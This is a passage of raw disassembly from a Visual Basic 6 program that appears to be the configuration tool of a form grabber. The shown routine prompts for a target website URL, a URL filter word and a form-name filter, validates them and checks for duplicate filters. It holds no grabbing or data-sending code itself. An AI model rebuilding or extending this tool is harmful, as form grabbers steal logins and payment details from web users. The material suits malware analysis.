008B4EAD: push 00000000h
008B4EAF: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B4EB4: test eax, eax
008B4EB6: jnz 008B4F72h
008B4EBC: mov var_04, 00000007h
008B4EC3: mov var_000000C8, 80020004h
008B4ECD: mov var_000000D0, 0000000Ah
008B4ED7: mov var_000000B8, 80020004h
008B4EE1: mov var_000000C0, 0000000Ah
008B4EEB: mov var_000000A8, 80020004h
008B4EF5: mov var_000000B0, 0000000Ah
008B4EFF: mov var_00000108, 00459E80h ; Invalid word/phrase
008B4F09: mov var_00000110, 00000008h
008B4F13: lea edx, var_00000110
008B4F19: lea ecx, var_000000A0
008B4F1F: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B4F24: lea eax, var_000000D0
008B4F2A: push eax
008B4F2B: lea eax, var_000000C0
008B4F31: push eax
008B4F32: lea eax, var_000000B0
008B4F38: push eax
008B4F39: push 00000010h
008B4F3B: lea eax, var_000000A0
008B4F41: push eax
008B4F42: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B4F47: lea eax, var_000000D0
008B4F4D: push eax
008B4F4E: lea eax, var_000000C0
008B4F54: push eax
008B4F55: lea eax, var_000000B0
008B4F5B: push eax
008B4F5C: lea eax, var_000000A0
008B4F62: push eax
008B4F63: push 00000004h
008B4F65: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B4F6A: add esp, 00000014h
008B4F6D: jmp 008B674Dh
008B4F72: mov var_04, 0000000Ah
008B4F79: mov var_000000F8, 80020004h
008B4F83: mov var_00000100, 0000000Ah
008B4F8D: mov var_000000E8, 80020004h
008B4F97: mov var_000000F0, 0000000Ah
008B4FA1: mov var_000000D8, 80020004h
008B4FAB: mov var_000000E0, 0000000Ah
008B4FB5: mov var_000000C8, 80020004h
008B4FBF: mov var_000000D0, 0000000Ah
008B4FC9: mov var_000000B8, 80020004h
008B4FD3: mov var_000000C0, 0000000Ah
008B4FDD: mov var_000000A8, 80020004h
008B4FE7: mov var_000000B0, 0000000Ah
008B4FF1: mov var_00000108, 00459EACh ; Enter the home web address/URL to target, ie. http://website.com
008B4FFB: mov var_00000110, 00000008h
008B5005: lea edx, var_00000110
008B500B: lea ecx, var_000000A0
008B5011: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B5016: lea eax, var_00000100
008B501C: push eax
008B501D: lea eax, var_000000F0
008B5023: push eax
008B5024: lea eax, var_000000E0
008B502A: push eax
008B502B: lea eax, var_000000D0
008B5031: push eax
008B5032: lea eax, var_000000C0
008B5038: push eax
008B5039: lea eax, var_000000B0
008B503F: push eax
008B5040: lea eax, var_000000A0
008B5046: push eax
008B5047: call 00410994h ; InputBox
008B504C: mov edx, eax
008B504E: lea ecx, var_38
008B5051: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5056: lea eax, var_00000100
008B505C: push eax
008B505D: lea eax, var_000000F0
008B5063: push eax
008B5064: lea eax, var_000000E0
008B506A: push eax
008B506B: lea eax, var_000000D0
008B5071: push eax
008B5072: lea eax, var_000000C0
008B5078: push eax
008B5079: lea eax, var_000000B0
008B507F: push eax
008B5080: lea eax, var_000000A0
008B5086: push eax
008B5087: push 00000007h
008B5089: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B508E: add esp, 00000020h
008B5091: mov var_04, 0000000Bh
008B5098: push var_38
008B509B: push 00000000h
008B509D: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B50A2: test eax, eax
008B50A4: jnz 008B5160h
008B50AA: mov var_04, 0000000Ch
008B50B1: mov var_000000C8, 80020004h
008B50BB: mov var_000000D0, 0000000Ah
008B50C5: mov var_000000B8, 80020004h
008B50CF: mov var_000000C0, 0000000Ah
008B50D9: mov var_000000A8, 80020004h
008B50E3: mov var_000000B0, 0000000Ah
008B50ED: mov var_00000108, 00459F34h ; Invalid address/URL
008B50F7: mov var_00000110, 00000008h
008B5101: lea edx, var_00000110
008B5107: lea ecx, var_000000A0
008B510D: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B5112: lea eax, var_000000D0
008B5118: push eax
008B5119: lea eax, var_000000C0
008B511F: push eax
008B5120: lea eax, var_000000B0
008B5126: push eax
008B5127: push 00000010h
008B5129: lea eax, var_000000A0
008B512F: push eax
008B5130: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B5135: lea eax, var_000000D0
008B513B: push eax
008B513C: lea eax, var_000000C0
008B5142: push eax
008B5143: lea eax, var_000000B0
008B5149: push eax
008B514A: lea eax, var_000000A0
008B5150: push eax
008B5151: push 00000004h
008B5153: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B5158: add esp, 00000014h
008B515B: jmp 008B674Dh
008B5160: mov var_04, 0000000Fh
008B5167: mov var_000000F8, 80020004h
008B5171: mov var_00000100, 0000000Ah
008B517B: mov var_000000E8, 80020004h
008B5185: mov var_000000F0, 0000000Ah
008B518F: mov var_000000D8, 80020004h
008B5199: mov var_000000E0, 0000000Ah
008B51A3: mov var_000000C8, 80020004h
008B51AD: mov var_000000D0, 0000000Ah
008B51B7: mov var_000000B8, 80020004h
008B51C1: mov var_000000C0, 0000000Ah
008B51CB: mov var_000000A8, 80020004h
008B51D5: mov var_000000B0, 0000000Ah
008B51DF: push 00459D68h ; Filter form grabber by word in URL.
008B51E4: push 00441264h ; vbCrLf
008B51E9: call 00410A18h ; &
008B51EE: mov edx, eax
008B51F0: lea ecx, var_48
008B51F3: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B51F8: push eax
008B51F9: push 00459F94h ; Enter any word/phrase that's included in the URL.
008B51FE: call 00410A18h ; &
008B5203: mov edx, eax
008B5205: lea ecx, var_4C
008B5208: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B520D: push eax
008B520E: push 00441264h ; vbCrLf
008B5213: call 00410A18h ; &
008B5218: mov edx, eax
008B521A: lea ecx, var_50
008B521D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5222: push eax
008B5223: push 00441264h ; vbCrLf
008B5228: call 00410A18h ; &
008B522D: mov edx, eax
008B522F: lea ecx, var_54
008B5232: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5237: push eax
008B5238: push 00459FFCh ; Note: This filter will force the grabber to only grab forms from URLs containing entered word/phrase.
008B523D: call 00410A18h ; &
008B5242: mov edx, eax
008B5244: lea ecx, var_58
008B5247: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B524C: push eax
008B524D: push 00441264h ; vbCrLf
008B5252: call 00410A18h ; &
008B5257: mov edx, eax
008B5259: lea ecx, var_5C
008B525C: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5261: push eax
008B5262: push 00441264h ; vbCrLf
008B5267: call 00410A18h ; &
008B526C: mov edx, eax
008B526E: lea ecx, var_60
008B5271: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5276: push eax
008B5277: push 0045A17Ch ; Ie. If the home URL is http://google.com, then a good filter word for the URL would be google.
008B527C: call 00410A18h ; &
008B5281: mov var_00000098, eax
008B5287: mov var_000000A0, 00000008h
008B5291: lea eax, var_00000100
008B5297: push eax
008B5298: lea eax, var_000000F0
008B529E: push eax
008B529F: lea eax, var_000000E0
008B52A5: push eax
008B52A6: lea eax, var_000000D0
008B52AC: push eax
008B52AD: lea eax, var_000000C0
008B52B3: push eax
008B52B4: lea eax, var_000000B0
008B52BA: push eax
008B52BB: lea eax, var_000000A0
008B52C1: push eax
008B52C2: call 00410994h ; InputBox
008B52C7: mov edx, eax
008B52C9: lea ecx, var_3C
008B52CC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B52D1: lea eax, var_60
008B52D4: push eax
008B52D5: lea eax, var_5C
008B52D8: push eax
008B52D9: lea eax, var_58
008B52DC: push eax
008B52DD: lea eax, var_54
008B52E0: push eax
008B52E1: lea eax, var_50
008B52E4: push eax
008B52E5: lea eax, var_4C
008B52E8: push eax
008B52E9: lea eax, var_48
008B52EC: push eax
008B52ED: push 00000007h
008B52EF: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B52F4: add esp, 00000020h
008B52F7: lea eax, var_00000100
008B52FD: push eax
008B52FE: lea eax, var_000000F0
008B5304: push eax
008B5305: lea eax, var_000000E0
008B530B: push eax
008B530C: lea eax, var_000000D0
008B5312: push eax
008B5313: lea eax, var_000000C0
008B5319: push eax
008B531A: lea eax, var_000000B0
008B5320: push eax
008B5321: lea eax, var_000000A0
008B5327: push eax
008B5328: push 00000007h
008B532A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B532F: add esp, 00000020h
008B5332: mov var_04, 00000010h
008B5339: push var_3C
008B533C: call 0041098Eh ; Len(arg_1)
008B5341: cmp eax, 00000004h
008B5344: jnl 008B5400h
008B534A: mov var_04, 00000011h
008B5351: mov var_000000C8, 80020004h
008B535B: mov var_000000D0, 0000000Ah
008B5365: mov var_000000B8, 80020004h
008B536F: mov var_000000C0, 0000000Ah
008B5379: mov var_000000A8, 80020004h
008B5383: mov var_000000B0, 0000000Ah
008B538D: mov var_00000108, 0045A240h ; URL filter word is too short. Minimum length is 4 characters.
008B5397: mov var_00000110, 00000008h
008B53A1: lea edx, var_00000110
008B53A7: lea ecx, var_000000A0
008B53AD: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B53B2: lea eax, var_000000D0
008B53B8: push eax
008B53B9: lea eax, var_000000C0
008B53BF: push eax
008B53C0: lea eax, var_000000B0
008B53C6: push eax
008B53C7: push 00000010h
008B53C9: lea eax, var_000000A0
008B53CF: push eax
008B53D0: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B53D5: lea eax, var_000000D0
008B53DB: push eax
008B53DC: lea eax, var_000000C0
008B53E2: push eax
008B53E3: lea eax, var_000000B0
008B53E9: push eax
008B53EA: lea eax, var_000000A0
008B53F0: push eax
008B53F1: push 00000004h
008B53F3: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B53F8: add esp, 00000014h
008B53FB: jmp 008B674Dh
008B5400: mov var_04, 00000014h
008B5407: mov var_000000F8, 80020004h
008B5411: mov var_00000100, 0000000Ah
008B541B: mov var_000000E8, 80020004h
008B5425: mov var_000000F0, 0000000Ah
008B542F: mov var_000000D8, 80020004h
008B5439: mov var_000000E0, 0000000Ah
008B5443: mov var_000000C8, 80020004h
008B544D: mov var_000000D0, 0000000Ah
008B5457: mov var_000000B8, 80020004h
008B5461: mov var_000000C0, 0000000Ah
008B546B: mov var_000000A8, 80020004h
008B5475: mov var_000000B0, 0000000Ah
008B547F: push 0045A2C0h ; Enter a name for forms (leave empty for no filter).
008B5484: push 00441264h ; vbCrLf
008B5489: call 00410A18h ; &
008B548E: mov edx, eax
008B5490: lea ecx, var_48
008B5493: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5498: push eax
008B5499: push 00441264h ; vbCrLf
008B549E: call 00410A18h ; &
008B54A3: mov edx, eax
008B54A5: lea ecx, var_4C
008B54A8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B54AD: push eax
008B54AE: push 0045A360h ; Note: Using this filter, will force the form grabber to only grab forms whose name contains the entered word.
008B54B3: call 00410A18h ; &
008B54B8: mov var_00000098, eax
008B54BE: mov var_000000A0, 00000008h
008B54C8: lea eax, var_00000100
008B54CE: push eax
008B54CF: lea eax, var_000000F0
008B54D5: push eax
008B54D6: lea eax, var_000000E0
008B54DC: push eax
008B54DD: lea eax, var_000000D0
008B54E3: push eax
008B54E4: lea eax, var_000000C0
008B54EA: push eax
008B54EB: lea eax, var_000000B0
008B54F1: push eax
008B54F2: lea eax, var_000000A0
008B54F8: push eax
008B54F9: call 00410994h ; InputBox
008B54FE: mov edx, eax
008B5500: lea ecx, var_40
008B5503: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5508: lea eax, var_4C
008B550B: push eax
008B550C: lea eax, var_48
008B550F: push eax
008B5510: push 00000002h
008B5512: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B5517: add esp, 0000000Ch
008B551A: lea eax, var_00000100
008B5520: push eax
008B5521: lea eax, var_000000F0
008B5527: push eax
008B5528: lea eax, var_000000E0
008B552E: push eax
008B552F: lea eax, var_000000D0
008B5535: push eax
008B5536: lea eax, var_000000C0
008B553C: push eax
008B553D: lea eax, var_000000B0
008B5543: push eax
008B5544: lea eax, var_000000A0
008B554A: push eax
008B554B: push 00000007h
008B554D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B5552: add esp, 00000020h
008B5555: mov var_04, 00000015h
008B555C: mov var_00000108, 00000001h
008B5566: mov var_00000110, 00000002h
008B5570: push 004412BCh
008B5575: push 00000000h
008B5577: push 00000007h
008B5579: mov eax, [ebp+08h]
008B557C: mov eax, [eax]
008B557E: push [ebp+08h]
008B5581: call [eax+0000031Ch]
008B5587: push eax
008B5588: lea eax, var_64
008B558B: push eax
008B558C: call 00410A84h ; Set (object)
008B5591: push eax
008B5592: lea eax, var_000000A0
008B5598: push eax
008B5599: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B559E: add esp, 00000010h
008B55A1: push eax
008B55A2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B55A7: push eax
008B55A8: lea eax, var_68
008B55AB: push eax
008B55AC: call 00410A84h ; Set (object)
008B55B1: mov var_0000017C, eax
008B55B7: lea eax, var_00000178
008B55BD: push eax
008B55BE: mov eax, var_0000017C
008B55C4: mov eax, [eax]
008B55C6: push var_0000017C
008B55CC: call [eax+1Ch]
008B55CF: fclex 
008B55D1: mov var_00000180, eax
008B55D7: cmp var_00000180, 00000000h
008B55DE: jnl 8B5600h
008B55E0: push 0000001Ch
008B55E2: push 004412BCh
008B55E7: push var_0000017C
008B55ED: push var_00000180
008B55F3: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B55F8: mov var_00000224, eax
008B55FE: jmp 8B5607h
008B5600: and var_00000224, 00000000h
008B5607: mov eax, var_00000178
008B560D: mov var_00000118, eax
008B5613: mov var_00000120, 00000003h
008B561D: mov var_00000128, 00000001h
008B5627: mov var_00000130, 00000002h
008B5631: lea eax, var_00000110
008B5637: push eax
008B5638: lea eax, var_00000120
008B563E: push eax
008B563F: lea eax, var_00000130
008B5645: push eax
008B5646: lea eax, var_000001DC
008B564C: push eax
008B564D: lea eax, var_000001CC
008B5653: push eax
008B5654: lea eax, var_30
008B5657: push eax
008B5658: call 00410A3Ch ; For
008B565D: mov var_00000218, eax
008B5663: lea eax, var_68
008B5666: push eax
008B5667: lea eax, var_64
008B566A: push eax
008B566B: push 00000002h
008B566D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B5672: add esp, 0000000Ch
008B5675: lea ecx, var_000000A0
008B567B: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B5680: jmp 008B5C37h
008B5685: mov var_04, 00000016h
008B568C: push 004412BCh
008B5691: push 00000000h
008B5693: push 00000007h
008B5695: mov eax, [ebp+08h]
008B5698: mov eax, [eax]
008B569A: push [ebp+08h]
008B569D: call [eax+0000031Ch]
008B56A3: push eax
008B56A4: lea eax, var_64
008B56A7: push eax
008B56A8: call 00410A84h ; Set (object)
008B56AD: push eax
008B56AE: lea eax, var_000000A0
008B56B4: push eax
008B56B5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B56BA: add esp, 00000010h
008B56BD: push eax
008B56BE: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B56C3: push eax
008B56C4: lea eax, var_68
008B56C7: push eax
008B56C8: call 00410A84h ; Set (object)
008B56CD: mov var_0000017C, eax
008B56D3: lea eax, var_6C
008B56D6: push eax
008B56D7: lea eax, var_30
008B56DA: push eax
008B56DB: mov eax, var_0000017C
008B56E1: mov eax, [eax]
008B56E3: push var_0000017C
008B56E9: call [eax+24h]
008B56EC: fclex 
008B56EE: mov var_00000180, eax
008B56F4: cmp var_00000180, 00000000h
008B56FB: jnl 8B571Dh
008B56FD: push 00000024h
008B56FF: push 004412BCh
008B5704: push var_0000017C
008B570A: push var_00000180
008B5710: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5715: mov var_00000228, eax
008B571B: jmp 8B5724h
008B571D: and var_00000228, 00000000h
008B5724: mov eax, var_6C
008B5727: mov var_00000184, eax
008B572D: lea eax, var_48
008B5730: push eax
008B5731: mov eax, var_00000184
008B5737: mov eax, [eax]
008B5739: push var_00000184
008B573F: call [eax+24h]
008B5742: fclex 
008B5744: mov var_00000188, eax
008B574A: cmp var_00000188, 00000000h
008B5751: jnl 8B5773h
008B5753: push 00000024h
008B5755: push 004412DCh
008B575A: push var_00000184
008B5760: push var_00000188
008B5766: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B576B: mov var_0000022C, eax
008B5771: jmp 8B577Ah
008B5773: and var_0000022C, 00000000h
008B577A: push 004412BCh
008B577F: push 00000000h
008B5781: push 00000007h
008B5783: mov eax, [ebp+08h]
008B5786: mov eax, [eax]
008B5788: push [ebp+08h]
008B578B: call [eax+0000031Ch]
008B5791: push eax
008B5792: lea eax, var_70
008B5795: push eax
008B5796: call 00410A84h ; Set (object)
008B579B: push eax
008B579C: lea eax, var_000000B0
008B57A2: push eax
008B57A3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B57A8: add esp, 00000010h
008B57AB: push eax
008B57AC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B57B1: push eax
008B57B2: lea eax, var_74
008B57B5: push eax
008B57B6: call 00410A84h ; Set (object)
008B57BB: mov var_0000018C, eax
008B57C1: lea eax, var_78
008B57C4: push eax
008B57C5: lea eax, var_30
008B57C8: push eax
008B57C9: mov eax, var_0000018C
008B57CF: mov eax, [eax]
008B57D1: push var_0000018C
008B57D7: call [eax+24h]
008B57DA: fclex 
008B57DC: mov var_00000190, eax
008B57E2: cmp var_00000190, 00000000h
008B57E9: jnl 8B580Bh
008B57EB: push 00000024h
008B57ED: push 004412BCh
008B57F2: push var_0000018C
008B57F8: push var_00000190
008B57FE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5803: mov var_00000230, eax
008B5809: jmp 8B5812h
008B580B: and var_00000230, 00000000h
008B5812: mov eax, var_78
008B5815: mov var_00000194, eax
008B581B: lea eax, var_4C
008B581E: push eax
008B581F: push 00000001h
008B5821: mov eax, var_00000194
008B5827: mov eax, [eax]
008B5829: push var_00000194
008B582F: call [eax+00000084h]
008B5835: fclex 
008B5837: mov var_00000198, eax
008B583D: cmp var_00000198, 00000000h
008B5844: jnl 8B5869h
008B5846: push 00000084h
008B584B: push 004412DCh
008B5850: push var_00000194
008B5856: push var_00000198
008B585C: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5861: mov var_00000234, eax
008B5867: jmp 8B5870h
008B5869: and var_00000234, 00000000h
008B5870: push 004412BCh
008B5875: push 00000000h
008B5877: push 00000007h
008B5879: mov eax, [ebp+08h]
008B587C: mov eax, [eax]
008B587E: push [ebp+08h]
008B5881: call [eax+0000031Ch]
008B5887: push eax
008B5888: lea eax, var_7C
008B588B: push eax
008B588C: call 00410A84h ; Set (object)
008B5891: push eax
008B5892: lea eax, var_000000C0
008B5898: push eax
008B5899: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B589E: add esp, 00000010h
008B58A1: push eax
008B58A2: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B58A7: push eax
008B58A8: lea eax, var_80
008B58AB: push eax
008B58AC: call 00410A84h ; Set (object)
008B58B1: mov var_0000019C, eax
008B58B7: lea eax, var_00000084
008B58BD: push eax
008B58BE: lea eax, var_30
008B58C1: push eax
008B58C2: mov eax, var_0000019C
008B58C8: mov eax, [eax]
008B58CA: push var_0000019C
008B58D0: call [eax+24h]
008B58D3: fclex 
008B58D5: mov var_000001A0, eax
008B58DB: cmp var_000001A0, 00000000h
008B58E2: jnl 8B5904h
008B58E4: push 00000024h
008B58E6: push 004412BCh
008B58EB: push var_0000019C
008B58F1: push var_000001A0
008B58F7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B58FC: mov var_00000238, eax
008B5902: jmp 8B590Bh
008B5904: and var_00000238, 00000000h
008B590B: mov eax, var_00000084
008B5911: mov var_000001A4, eax
008B5917: lea eax, var_50
008B591A: push eax
008B591B: push 00000002h
008B591D: mov eax, var_000001A4
008B5923: mov eax, [eax]
008B5925: push var_000001A4
008B592B: call [eax+00000084h]
008B5931: fclex 
008B5933: mov var_000001A8, eax
008B5939: cmp var_000001A8, 00000000h
008B5940: jnl 8B5965h
008B5942: push 00000084h
008B5947: push 004412DCh
008B594C: push var_000001A4
008B5952: push var_000001A8
008B5958: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B595D: mov var_0000023C, eax
008B5963: jmp 8B596Ch
008B5965: and var_0000023C, 00000000h
008B596C: push 004412BCh
008B5971: push 00000000h
008B5973: push 00000007h
008B5975: mov eax, [ebp+08h]
008B5978: mov eax, [eax]
008B597A: push [ebp+08h]
008B597D: call [eax+0000031Ch]
008B5983: push eax
008B5984: lea eax, var_00000088
008B598A: push eax
008B598B: call 00410A84h ; Set (object)
008B5990: push eax
008B5991: lea eax, var_000000D0
008B5997: push eax
008B5998: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B599D: add esp, 00000010h
008B59A0: push eax
008B59A1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B59A6: push eax
008B59A7: lea eax, var_0000008C
008B59AD: push eax
008B59AE: call 00410A84h ; Set (object)
008B59B3: mov var_000001AC, eax
008B59B9: lea eax, var_00000090
008B59BF: push eax
008B59C0: lea eax, var_30
008B59C3: push eax
008B59C4: mov eax, var_000001AC
008B59CA: mov eax, [eax]
008B59CC: push var_000001AC
008B59D2: call [eax+24h]
008B59D5: fclex 
008B59D7: mov var_000001B0, eax
008B59DD: cmp var_000001B0, 00000000h
008B59E4: jnl 8B5A06h
008B59E6: push 00000024h
008B59E8: push 004412BCh
008B59ED: push var_000001AC
008B59F3: push var_000001B0
008B59F9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B59FE: mov var_00000240, eax
008B5A04: jmp 8B5A0Dh
008B5A06: and var_00000240, 00000000h
008B5A0D: mov eax, var_00000090
008B5A13: mov var_000001B4, eax
008B5A19: lea eax, var_54
008B5A1C: push eax
008B5A1D: push 00000003h
008B5A1F: mov eax, var_000001B4
008B5A25: mov eax, [eax]
008B5A27: push var_000001B4
008B5A2D: call [eax+00000084h]
008B5A33: fclex 
008B5A35: mov var_000001B8, eax
008B5A3B: cmp var_000001B8, 00000000h
008B5A42: jnl 8B5A67h
008B5A44: push 00000084h
008B5A49: push 004412DCh
008B5A4E: push var_000001B4
008B5A54: push var_000001B8
008B5A5A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5A5F: mov var_00000244, eax
008B5A65: jmp 8B5A6Eh
008B5A67: and var_00000244, 00000000h
008B5A6E: push var_48
008B5A71: push var_34
008B5A74: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B5A79: mov esi, eax
008B5A7B: neg esi
008B5A7D: sbb esi, esi
008B5A7F: inc esi
008B5A80: neg esi
008B5A82: push var_4C
008B5A85: push var_38
008B5A88: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B5A8D: neg eax
008B5A8F: sbb eax, eax
008B5A91: inc eax
008B5A92: neg eax
008B5A94: and si, ax
008B5A97: push var_50
008B5A9A: push var_3C
008B5A9D: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B5AA2: neg eax
008B5AA4: sbb eax, eax
008B5AA6: inc eax
008B5AA7: neg eax
008B5AA9: and si, ax
008B5AAC: push var_54
008B5AAF: push var_40
008B5AB2: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B5AB7: neg eax
008B5AB9: sbb eax, eax
008B5ABB: inc eax
008B5ABC: neg eax
008B5ABE: and si, ax
008B5AC1: mov var_000001BC, si
008B5AC8: lea eax, var_54
008B5ACB: push eax
008B5ACC: lea eax, var_50
008B5ACF: push eax
008B5AD0: lea eax, var_4C
008B5AD3: push eax
008B5AD4: lea eax, var_48
008B5AD7: push eax
008B5AD8: push 00000004h
008B5ADA: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B5ADF: add esp, 00000014h
008B5AE2: lea eax, var_00000090
008B5AE8: push eax
008B5AE9: lea eax, var_0000008C
008B5AEF: push eax
008B5AF0: lea eax, var_00000088
008B5AF6: push eax
008B5AF7: lea eax, var_00000084
008B5AFD: push eax
008B5AFE: lea eax, var_80
008B5B01: push eax
008B5B02: lea eax, var_7C
008B5B05: push eax
008B5B06: lea eax, var_78
008B5B09: push eax
008B5B0A: lea eax, var_74
008B5B0D: push eax
008B5B0E: lea eax, var_70
008B5B11: push eax
008B5B12: lea eax, var_6C
008B5B15: push eax
008B5B16: lea eax, var_68
008B5B19: push eax
008B5B1A: lea eax, var_64
008B5B1D: push eax
008B5B1E: push 0000000Ch
008B5B20: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B5B25: add esp, 00000034h
008B5B28: lea eax, var_000000D0
008B5B2E: push eax
008B5B2F: lea eax, var_000000C0
008B5B35: push eax
008B5B36: lea eax, var_000000B0
008B5B3C: push eax
008B5B3D: lea eax, var_000000A0
008B5B43: push eax
008B5B44: push 00000004h
008B5B46: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B5B4B: add esp, 00000014h
008B5B4E: movsx eax, word ptr var_000001BC
008B5B55: test eax, eax
008B5B57: jz 008B5C13h
008B5B5D: mov var_04, 00000017h
008B5B64: mov var_000000C8, 80020004h
008B5B6E: mov var_000000D0, 0000000Ah
008B5B78: mov var_000000B8, 80020004h
008B5B82: mov var_000000C0, 0000000Ah
008B5B8C: mov var_000000A8, 80020004h
008B5B96: mov var_000000B0, 0000000Ah
008B5BA0: mov var_00000108, 0045A440h ; Filter already exists!
008B5BAA: mov var_00000110, 00000008h
008B5BB4: lea edx, var_00000110
008B5BBA: lea ecx, var_000000A0
008B5BC0: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B5BC5: lea eax, var_000000D0
008B5BCB: push eax
008B5BCC: lea eax, var_000000C0
008B5BD2: push eax
008B5BD3: lea eax, var_000000B0
008B5BD9: push eax
008B5BDA: push 00000030h
008B5BDC: lea eax, var_000000A0
008B5BE2: push eax
008B5BE3: call 004109E8h ; MsgBox(arg_1, arg_2, arg_3, arg_4, arg_5)
008B5BE8: lea eax, var_000000D0
008B5BEE: push eax
008B5BEF: lea eax, var_000000C0
008B5BF5: push eax
008B5BF6: lea eax, var_000000B0
008B5BFC: push eax
008B5BFD: lea eax, var_000000A0
008B5C03: push eax
008B5C04: push 00000004h
008B5C06: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B5C0B: add esp, 00000014h
008B5C0E: jmp 008B674Dh
008B5C13: mov var_04, 0000001Ah
008B5C1A: lea eax, var_000001DC
008B5C20: push eax
008B5C21: lea eax, var_000001CC
008B5C27: push eax
008B5C28: lea eax, var_30
008B5C2B: push eax
008B5C2C: call 00410A36h ; Next
008B5C31: mov var_00000218, eax
008B5C37: cmp var_00000218, 00000000h
008B5C3E: jnz 008B5685h
008B5C44: mov var_04, 0000001Bh
008B5C4B: push 004412BCh
008B5C50: push 00000000h
008B5C52: push 00000007h
008B5C54: mov eax, [ebp+08h]
008B5C57: mov eax, [eax]
008B5C59: push [ebp+08h]
008B5C5C: call [eax+0000031Ch]
008B5C62: push eax
008B5C63: lea eax, var_64
008B5C66: push eax
008B5C67: call 00410A84h ; Set (object)
008B5C6C: push eax
008B5C6D: lea eax, var_000000A0
008B5C73: push eax
008B5C74: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B5C79: add esp, 00000010h
008B5C7C: push eax
008B5C7D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B5C82: push eax
008B5C83: lea eax, var_68
008B5C86: push eax
008B5C87: call 00410A84h ; Set (object)
008B5C8C: mov var_0000017C, eax
008B5C92: lea eax, var_00000178
008B5C98: push eax
008B5C99: mov eax, var_0000017C
008B5C9F: mov eax, [eax]
008B5CA1: push var_0000017C
008B5CA7: call [eax+1Ch]
008B5CAA: fclex 
008B5CAC: mov var_00000180, eax
008B5CB2: cmp var_00000180, 00000000h
008B5CB9: jnl 8B5CDBh
008B5CBB: push 0000001Ch
008B5CBD: push 004412BCh
008B5CC2: push var_0000017C
008B5CC8: push var_00000180
008B5CCE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B5CD3: mov var_00000248, eax
008B5CD9: jmp 8B5CE2h
008B5CDB: and var_00000248, 00000000h
008B5CE2: mov eax, var_00000178
008B5CE8: add eax, 00000001h
008B5CEB: jo 008B687Ch
008B5CF1: push eax
008B5CF2: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008B5CF7: mov edx, eax
008B5CF9: lea ecx, var_48
008B5CFC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5D01: push eax
008B5D02: push 004412D0h
008B5D07: call 00410A18h ; &
008B5D0C: mov edx, eax
008B5D0E: lea ecx, var_44
008B5D11: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B5D16: lea ecx, var_48
008B5D19: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008B5D1E: lea eax, var_68
008B5D21: push eax
008B5D22: lea eax, var_64
008B5D25: push eax
008B5D26: push 00000002h
008B5D28: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B5D2D: add esp, 0000000Ch
008B5D30: lea ecx, var_000000A0
